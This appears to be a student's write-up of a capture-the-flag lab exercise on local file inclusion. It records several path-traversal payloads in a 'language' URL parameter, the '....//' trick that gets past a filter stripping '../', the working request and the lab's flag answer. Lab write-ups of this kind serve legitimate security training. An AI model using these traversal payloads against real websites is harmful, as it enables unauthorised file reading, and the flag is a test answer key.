# Section 03: Basic Bypasses

Module: 20. File Inclusion

---

## Questions & Answers

### 1. The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt

Context:
- Try to use `/index.php?language=../../../../../flag.txt`, but got ` Illegal path specified! `, so I tried:
```
/index.php?language=languages/../../../../../../flag.txt => got blank
```
- `languages` must be specified, so tried other variants:
```
/index.php?language=languages%2F%2F%2F%2F%2F%2Fflag.txt => got blank
/index.php?language=languages%2F%2F%2F%2F%2F%2Fflag.txt => got blank
http://154.57.164.78:32312/index.php?language=languages/....//....//....//....//....//....//....//flag.txt =>  HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!} 
```
- The app is filter `'../'` to blank `''` so used `....//`

**Answer:** `HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}`

---

[Back to Module Index](./README.md)
